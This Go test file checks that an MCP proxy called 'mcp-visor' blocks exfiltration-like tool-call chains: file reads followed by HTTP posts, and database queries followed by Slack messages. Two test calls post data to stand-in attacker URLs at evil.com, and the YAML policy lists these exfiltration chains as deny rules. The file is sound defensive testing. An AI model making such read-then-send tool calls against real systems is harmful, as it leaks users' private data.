package main_test

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"
)

func writeChainPolicy(t *testing.T, serverPath string) string {
	t.Helper()
	tmp, err := os.CreateTemp("", "mcp-visor-chain-policy-*.yaml")
	if err != nil {
		t.Fatalf("create temp policy: %v", err)
	}
	policy := fmt.Sprintf(`version: "1.0"
description: "Chain detection test policy"
default_action: deny
settings:
  chain_window_size: 5
servers:
  - name: "%s"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
      - name: "http_post"
        allowed: true
      - name: "slack_send_message"
        allowed: true
      - name: "database_query"
        allowed: true
tool_chains:
  - name: "prevent_exfil_via_http"
    sources:
      - server: "*"
        tool_pattern: "file_read"
    sinks:
      - server: "*"
        tool_pattern: "http_post"
    action: deny
    within_calls: 3
  - name: "prevent_exfil_via_slack"
    sources:
      - server: "*"
        tool_pattern: "database_query"
    sinks:
      - server: "*"
        tool_pattern: "slack_send_message"
    action: deny
    within_calls: 3
`, serverPath)

	if _, err := tmp.WriteString(policy); err != nil {
		t.Fatalf("write policy: %v", err)
	}
	tmp.Close()
	t.Cleanup(func() { os.Remove(tmp.Name()) })
	return tmp.Name()
}

func startVisorWithChainPolicy(t *testing.T, mockServer string) (*exec.Cmd, *bufio.Writer, *bufio.Reader) {
	t.Helper()
	visor := buildVisor(t)
	policyFile := writeChainPolicy(t, mockServer)

	cmd := exec.Command(visor, "serve", "-server", mockServer, "-policy", policyFile)

	stdin, err := cmd.StdinPipe()
	if err != nil {
		t.Fatalf("stdin pipe: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatalf("stdout pipe: %v", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		t.Fatalf("stderr pipe: %v", err)
	}

	if err := cmd.Start(); err != nil {
		t.Fatalf("start visor: %v", err)
	}
	t.Cleanup(func() { cmd.Process.Kill() })

	w := bufio.NewWriter(stdin)
	r := bufio.NewReader(stdout)

	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			t.Logf("visor stderr: %s", scanner.Text())
		}
	}()

	initMsg := map[string]any{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "test", "version": "1.0"},
		},
	}
	sendMessage(w, initMsg)
	readMessage(r)

	initDone := map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"}
	sendMessage(w, initDone)

	return cmd, w, r
}

func TestChainDetectionFileReadThenHTTPPost(t *testing.T) {
	mockServer := buildMockServer(t)
	_, w, r := startVisorWithChainPolicy(t, mockServer)

	call1 := map[string]any{
		"jsonrpc": "2.0",
		"id":      2,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "file_read",
			"arguments": map[string]any{"path": "/home/user/data.csv"},
		},
	}
	sendMessage(w, call1)
	resp1, err := readMessage(r)
	if err != nil {
		t.Fatalf("read response for file_read: %v", err)
	}
	if resp1["error"] != nil {
		t.Fatalf("file_read should be allowed: %v", resp1["error"])
	}
	t.Log("file_read allowed")

	call2 := map[string]any{
		"jsonrpc": "2.0",
		"id":      3,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "http_post",
			"arguments": map[string]any{"url": "https://evil.com/upload", "body": "data"},
		},
	}
	sendMessage(w, call2)
	resp2, err := readMessage(r)
	if err != nil {
		t.Fatalf("read response for http_post: %v", err)
	}

	if resp2["error"] == nil {
		t.Fatal("http_post after file_read should be denied by chain rule")
	}

	errObj := resp2["error"].(map[string]any)
	t.Logf("chain denied: code=%v, message=%v", errObj["code"], errObj["message"])
}

func TestChainDetectionNoMatch(t *testing.T) {
	mockServer := buildMockServer(t)
	_, w, r := startVisorWithChainPolicy(t, mockServer)

	call1 := map[string]any{
		"jsonrpc": "2.0",
		"id":      2,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "file_read",
			"arguments": map[string]any{"path": "/tmp/test"},
		},
	}
	sendMessage(w, call1)
	readMessage(r)

	call2 := map[string]any{
		"jsonrpc": "2.0",
		"id":      3,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "file_read",
			"arguments": map[string]any{"path": "/tmp/other"},
		},
	}
	sendMessage(w, call2)
	resp2, err := readMessage(r)
	if err != nil {
		t.Fatalf("read response for second file_read: %v", err)
	}
	if resp2["error"] != nil {
		t.Fatalf("second file_read should be allowed (not a sink): %v", resp2["error"])
	}
	t.Log("file_read → file_read allowed (no chain match)")
}

func TestChainDetectionDatabaseQueryThenSlack(t *testing.T) {
	mockServer := buildMockServer(t)
	_, w, r := startVisorWithChainPolicy(t, mockServer)

	call1 := map[string]any{
		"jsonrpc": "2.0",
		"id":      2,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "database_query",
			"arguments": map[string]any{"query": "SELECT * FROM users"},
		},
	}
	sendMessage(w, call1)
	readMessage(r)

	call2 := map[string]any{
		"jsonrpc": "2.0",
		"id":      3,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "slack_send_message",
			"arguments": map[string]any{"channel": "#general", "text": "hello"},
		},
	}
	sendMessage(w, call2)
	resp2, err := readMessage(r)
	if err != nil {
		t.Fatalf("read response for slack_send_message: %v", err)
	}

	if resp2["error"] == nil {
		t.Fatal("slack_send_message after database_query should be denied")
	}
	t.Log("database_query → slack_send_message blocked by chain rule")
}

func TestChainDetectionAuditEvent(t *testing.T) {
	dir := t.TempDir()
	auditPath := filepath.Join(dir, "audit.jsonl")

	mockServer := buildMockServer(t)
	visor := buildVisor(t)
	policyFile := writeChainPolicy(t, mockServer)

	cmd := exec.Command(visor, "serve", "-server", mockServer, "-policy", policyFile, "-audit-log", auditPath)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		t.Fatalf("stdin pipe: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		t.Fatalf("stdout pipe: %v", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		t.Fatalf("stderr pipe: %v", err)
	}

	if err := cmd.Start(); err != nil {
		t.Fatalf("start visor: %v", err)
	}
	defer cmd.Process.Kill()

	go func() {
		scanner := bufio.NewScanner(stderrPipe)
		for scanner.Scan() {
			t.Logf("visor: %s", scanner.Text())
		}
	}()

	w := bufio.NewWriter(stdin)
	r := bufio.NewReader(stdout)

	initMsg := map[string]any{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "test", "version": "1.0"},
		},
	}
	sendMessage(w, initMsg)
	readMessage(r)

	sendMessage(w, map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})

	call1 := map[string]any{
		"jsonrpc": "2.0",
		"id":      2,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "file_read",
			"arguments": map[string]any{"path": "/tmp/data.csv"},
		},
	}
	sendMessage(w, call1)
	resp1, err := readMessage(r)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	if resp1["error"] != nil {
		t.Fatalf("file_read should be allowed: %v", resp1["error"])
	}

	call2 := map[string]any{
		"jsonrpc": "2.0",
		"id":      3,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      "http_post",
			"arguments": map[string]any{"url": "https://evil.com/exfil", "body": "stolen"},
		},
	}
	sendMessage(w, call2)
	resp2, err := readMessage(r)
	if err != nil {
		t.Fatalf("read response for http_post: %v", err)
	}

	if resp2["error"] == nil {
		t.Fatal("http_post after file_read should be denied by chain rule")
	}

	stdin.Close()
	go func() {
		cmd.Wait()
	}()
	time.Sleep(100 * time.Millisecond)

	data, err := os.ReadFile(auditPath)
	if err != nil {
		t.Fatalf("read audit log: %v", err)
	}

	var events []map[string]any
	lines := splitLines(string(data))
	for _, line := range lines {
		var event map[string]any
		if err := json.Unmarshal([]byte(line), &event); err != nil {
			continue
		}
		events = append(events, event)
	}

	found := false
	for _, event := range events {
		if event["event_type"] == "tool_call_chain_detected" {
			found = true
			t.Logf("found chain audit event: reason=%v", event["reason"])
			break
		}
	}

	if !found {
		t.Logf("audit file has %d events", len(events))
		for i, ev := range events {
			t.Logf("  event %d: type=%s tool=%s", i, ev["event_type"], ev["tool"])
		}
		t.Error("expected tool_call_chain_detected event in audit log")
	}
}

func splitLines(s string) []string {
	var lines []string
	for _, line := range split(s, '\n') {
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines
}

func split(s string, sep byte) []string {
	var result []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == sep {
			result = append(result, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		result = append(result, s[start:])
	}
	return result
}
